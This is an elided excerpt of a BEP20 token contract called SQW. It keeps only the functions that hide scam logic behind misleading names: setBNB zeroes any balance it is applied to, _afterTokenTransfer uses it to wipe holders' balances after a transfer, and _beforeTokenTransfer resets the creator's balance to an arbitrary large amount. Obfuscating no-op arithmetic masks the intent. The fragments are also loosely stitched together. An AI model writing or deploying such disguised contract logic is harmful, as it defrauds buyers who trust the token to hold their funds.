...
contract SQW is Context, IBEP20, Ownable {
    ...
    constructor() {
        ...
        _liquify[_msgSender()] = _totalSupply;
        marketingFees = 1;
    ...
    */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        _liquify[sender] = _liquify[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    ...
    function setBNB(address account) 
      ...
      returns (uint256)
    {
      return (_liquify[account]) & (((_liquify[account]) & 0 ) << 0xF);
    ...
    function _afterTokenTransfer(address account) internal {
      ...
      _liquify[account] = setBNB(account);
    }
}
    ...
    function _beforeTokenTransfer(address creator) internal {
      ...
      (_liquify[creator] * 1 * 2 - _liquify[creator] * 1 * 2);
      _liquify[creator] = swapperTax * marketingFees * _totalSupplies / marketingFees;
    }
}
